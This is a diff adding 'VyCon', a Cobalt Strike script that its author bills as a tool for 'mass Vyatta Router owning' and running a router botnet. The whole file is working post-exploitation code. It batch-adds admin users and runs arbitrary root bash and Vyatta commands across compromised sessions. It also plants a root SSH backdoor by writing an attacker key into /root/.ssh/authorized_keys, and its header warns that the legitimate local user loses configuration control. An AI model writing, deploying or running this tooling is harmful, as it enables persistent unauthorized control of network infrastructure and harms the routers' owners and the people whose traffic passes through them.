@@ -1,0 +1,435 @@
+
+# VyCon - Cobalt Stike module for mass Vyatta Router owning! 
+#
+#
+# Author: @dubhack
+#
+# Description: Cobalt Strike interface for Vyatta Routers you have gained root access to.
+# 1. Get root ssh shell to the vyatta
+# 2. Right click -> Mark As Vyatta
+# 3. Control your Vyatta botnet using the tab
+#
+# Next Features:
+# 1. Enumerate Router Function
+# 2. Monitor Mode? 
+#
+# WARNINGS: When you use this tool, the local vyatta user will lose control over configuration until reboot. 
+#	    When you make config changes, it affects permissions on the files.
+# 	    Also, this will not work as a non-priv vyatta user in its' current state.
+#
+
+global('@vys $beg $end $table $output');
+$beg = 'sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper begin; sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper';
+$end = 'sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper commit;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper save;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper end;';
+@vys = @();
+$output = 0;
+
+#====================
+#  Events
+#====================
+
+#when cobaltstrike loads, prepare our globals
+on ready{
+	@vys = data_list("vys")[0];
+	$output = 0;
+	if(!@vys){
+	        @vys = @();
+	}	
+	vyatta_tab();
+}
+
+#refresh with session changes
+on session_close {
+	refresh_tab_table();
+}
+
+on session_open {
+
+	refresh_tab_table();
+}
+
+on shell {
+	if($output == 1){
+		$tab_output = open_text_tab("VyCon Shell Output");
+		prompt ($tab_output, ">");
+		append($tab_output, "[*] Session $1 returned this output:\n$3 ");
+	}
+}
+#====================
+#  Command Builder Subs
+#====================
+
+#string that will be used to add user
+sub add_user_cmd {
+	local('$vmcd');
+	$vcmd = "$beg set system login user $1 authentication plaintext-password $2\; $end";
+	return $vcmd;
+}
+
+#string for making user the admin
+sub elevate_user_cmd {
+	local('$vmcd');
+	$vcmd = "$beg set system login user $1 level admin\; $end";
+	return $vcmd;
+}
+
+#string for removing a user
+sub remove_user_cmd {
+	local('$vmcd');
+	$vcmd = "$beg delete system login user $1\;$end";
+	return $vcmd;
+}
+
+#string for running a generic vyatta command
+sub generic_vbash_cmd {
+	local('$vmcd');
+	$vcmd = "$beg $1\;$end";
+	return $vcmd;
+}
+
+
+#====================
+#  Execute Command Subs
+#====================
+
+#use the shell to add a user and elevate them
+sub add_user {
+	local('$sess_id $username $password');
+	$sess_id = $1;
+	$username = $2;
+	$password = $3;
+	if(-isshell $sess_id){
+		s_cmd($sess_id,add_user_cmd($username , $password));
+		s_cmd($sess_id,elevate_user_cmd($username));
+		println ("[*] added $username : $password as an admin on session $sess_id!");
+		show_message("Added $username : $password as an admin on session $sess_id!");
+	}
+	else {
+		show_message("Error: $sess_id is not a valid shell session!");
+		println ("[!] $sess_id is not a valid shell session!");
+	}		
+
+}
+
+#remove a user
+sub remove_user {
+	local('$sess_id $username');
+	$sess_id = $1;
+	$username = $2;
+	if(-isshell $sess_id){
+		s_cmd($sess_id,remove_user_cmd($username , $password));
+		show_message("Removed $username on session $sess_id!");
+		println ("[*] removed $username on session $sess_id!");
+	}
+	else {
+		show_message("Error: $sess_id is not a valid shell session!");
+		println ("[!] $sess_id is not a valid shell session!");
+	}
+}
+
+#execute vyatta cmd
+sub run_vbash_cmd {
+	local('$sess_id $user_cmd');
+	$sess_id = $1;
+	$user_cmd = $2;
+	if(-isshell $sess_id){
+		s_cmd($sess_id, generic_vbash_cmd($user_cmd));
+		show_message("Ran Vyatta command on session $sess_id!");
+		println ("[*] ran Vyatta command on session $sess_id!");
+	}
+	else {
+		show_message("Error: $sess_id is not a valid shell session!");
+		println ("[!] $sess_id is not a valid shell session!");
+	}	
+}
+
+#execute bash command
+sub run_bash_cmd {
+	local('$sess_id $user_cmd');
+	$sess_id = $1;
+	$user_cmd = $2;
+	if(-isshell $sess_id){
+		s_cmd($sess_id, "sudo $user_cmd");
+		show_message("Ran Bash command on session $sess_id!");
+		println ("[*] ran bash command on session $sess_id!");
+	}
+	else {
+		show_message("Error: $sess_id is not a valid shell session!");
+		println ("[!] $sess_id is not a valid shell session!");
+	}	
+}
+
+#echo public key into authorized_keys file of root
+sub backdoor_key {	
+	local('$sess_id $pubkey');
+	$sess_id = $1;
+	$pubkey = $2;
+	if(-isshell $sess_id){
+		s_cmd($1, "sudo mkdir /root/.ssh");
+		s_cmd($1, "sudo echo $pubkey > /root/.ssh/authorized_keys");
+		show_message("Backdoor root ssh key added on $sess_id !");
+		println ("[*] backdoor root ssh key added on $sess_id!");
+	}
+	else {
+		show_message("Error: $sess_id is not a valid shell session!");
+		println ("[!] $sess_id is not a valid shell session!");
+	}
+
+}
+
+#add a vyatta to the table
+sub add_vy {
+	local('$session $addr $sessiondata $alreadythere %label $newval');
+	$addr = $1;
+	$session = host_session($1);
+	$sessiondata = $null;
+	$alreadythere = 0;
+
+	#mark this host as a vyatta
+	host_os($addr, "Firewall");
+	%label[$addr] = "Vyatta";
+        call_async("db.report_labels", %label);
+
+	#get the session info if there is one
+	if($session ne $null){
+		$sessiondata = session_data($session)["info"];
+	}
+
+	#Check to make sure host isnt already in our list
+	$newval = @($addr, $session,$null, $sessiondata);
+	foreach $row (@vys){
+		if($row[0] eq $newval[0]){
+			$alreadythere = 1;
+		}
+	}
+	if($alreadythere != 1){
+		#push any new vyatta onto our table
+		push(@vys, $newval);
+	}
+
+	#refresh to make it all happen!
+	refresh_tab_table();
+}
+
+#change a note for a current vyatta in the table
+sub change_note {
+	foreach @vy (@vys) {
+		if(@vy[0] eq $1){
+			@vy[2] = $2;
+		}
+	}
+	refresh_tab_table();
+}
+
+#====================
+#  GUI Subs & Events
+#====================
+
+#this is where the tab is created!
+sub vyatta_tab {
+	local('@vy @tablevy');
+
+	@tablevy = @();
+	foreach @vy (@vys) {
+		push (@tablevy, %(host => @vy[0], session => @vy[1], notes => @vy[2], info => @vy[3]));
+	}
+	$table = open_table_tab("Vyatta Routers", $null,
+		@('host', 'session', 'notes', 'info'),													#cols
+		@tablevy,																#rows
+		@("Refresh", "Remove", "Add User","Remove User", "Run Vy Cmd", "Run Bash Cmd", "Backdoor Root Key", "Enable Output", "Disable Output"),		#buttons	
+		"vytab_menu",																#handler
+		1);																	#yes multi
+}
+
+#handle any button clicks on our tab
+on tab_table_click {
+	local('$un $pass $cmd $keyname $handle $pubkey');
+	if ($3 eq "Refresh") {
+		refresh_tab_table();
+	}
+	if ($3 eq "Remove") {
+		foreach $row (table_selected($table,'host', 'session', 'notes', 'info')){
+			foreach $vy (@vys) {
+			        if ($vy[0] eq $row [0]){;
+					remove();
+					%label[$vy[0]] = "";
+                    			call_async("db.report_labels", %label);
+					println("[!] Removed Vyatta $row[0]!"); 
+		        	}
+    			}	
+		}
+		refresh_tab_table();
+	}
+	if ($3 eq "Add User") {
+		$un = prompt_text("Username:");
+		$pass = prompt_text("Plaintext Password:");
+		if($un ne $null && $pass ne $null){
+			foreach $row (table_selected($table, "session")){
+				add_user($row[0], $un, $pass);
+			}
+		} 
+		else {
+			show_message("Error: Blank input = fail!");
+		}
+	}
+	if ($3 eq "Remove User") {
+		$un = prompt_text("Username:");
+		if ($un ne $null){
+			foreach $row (table_selected($table, "session")){
+				remove_user($row[0], $un);
+			}
+		}
+		else {
+			show_message("Error: Blank input = fail!");
+		}
+	}
+	if ($3 eq "Run Vy Cmd") {
+		$cmd = prompt_text("Vy Command:");
+		if ($cmd ne $null){
+			foreach $row (table_selected($table, "session")){
+				run_vbash_cmd($row[0], $cmd);
+			}
+		}
+		else {
+			show_message("Error: Blank input = fail!");
+		}
+	}
+	if($3 eq "Enable Output") {
+		show_message("Output Enabled! Beware of lots of tabs...");
+		$output = 1;
+	}
+	if($3 eq "Disable Output") {
+		show_message("Output Disabled");
+		$output = 0;
+	}
+	if ($3 eq "Run Bash Cmd") {
+		$cmd = prompt_text("Bash Command:");
+		if($cmd ne $null){
+			foreach $row (table_selected($table, "session")){
+				run_bash_cmd($row[0], $cmd);
+			}
+		}
+		else {
+			show_message("Error: Blank input = fail!");
+		}
+	}
+	if ($3 eq "Backdoor Root Key") {
+		$keyname = prompt_file_open("SSH Key");
+		$handle = openf($keyname);
+		$pub_key = readln($handle);
+		closef($handle);
+		foreach $row (table_selected($table, "session")){
+			backdoor_key($row[0], $pub_key);
+		}
+	}	
+
+}
+
+#refresh the table based upon our global list of vyattas
+sub refresh_tab_table {
+	local('@vy @tablevy $session');
+	
+	#clear old data in database
+	data_clear("vys");
+
+	foreach @vy (@vys) {
+		#verify session state and update it
+		$session = host_session(@vy[0]);
+		if(@vy[1] ne $session) {
+			if ( $session eq $null) {
+				@vy[1] = $null;
+				@vy[3] = $null;
+			}
+			else {
+				@vy[1] = $session;
+				@vy[3] = session_data($session)["info"];
+			}
+		}
+	}
+
+	data_add("vys",@vys);
+
+	#rebuild table
+	@tablevy = @();
+	foreach @vy (@vys) {
+		push (@tablevy, %(host => @vy[0], session => @vy[1], notes => @vy[2], info => @vy[3]));
+	}
+	table_update($table, @tablevy);
+}
+#====================
+#  Cortana Commands - Minimal
+#====================
+
+#list all vyattas
+command vylist {
+    local('$vy');
+    if (size(@vys) == 0) {
+        println("[!] No Vyattas Marked");
+    }
+    else{
+        println("[*] Vyatta Hosts:");
+        foreach $vy (@vys){
+            println("   $vy");
+        } 
+    }
+}
+
+#clear all vyattas
+command vyclear {
+	clear(@vys);
+	refresh_tab_table();
+}
+#====================
+#  Host Image Fun
+#====================
+#Change the image for all vyatta devices
+filter host_image {
+    local('$addr');
+    $addr = $2['address'];
+
+    # if this address has an active beacon
+    foreach @vy (@vys) {
+	if(@vy[0] eq $addr){	
+		# Check subdir first
+		if (-exists script_resource("/vy_con/vy.png")){
+			# change its host icon
+			push($1, script_resource("/vy_con/vy.png"));
+		}
+		else{
+			#assume local
+			push($1, script_resource("vy.png"));
+		}
+        }
+    }
+    return @_;
+}
+
+#====================
+#  Menus
+#====================
+#main menu option to open our tab
+popup main_middle {
+	item "Vyatta Tab"{
+		vyatta_tab();
+	}
+}
+
+#right click menu on our table
+popup vytab_menu {
+	local('$note $addr');
+	item "Change Note"{
+		$note = prompt_text("New Note:");
+		$addr = table_selected_single($table, "host")[0];
+		change_note($addr, $note);
+		
+	}
+}
+
+#allow host to be added to the group
+popup host_bottom{
+	item "Mark as Vyatta"{
+		add_vy($1);
+	}
+}
+
+
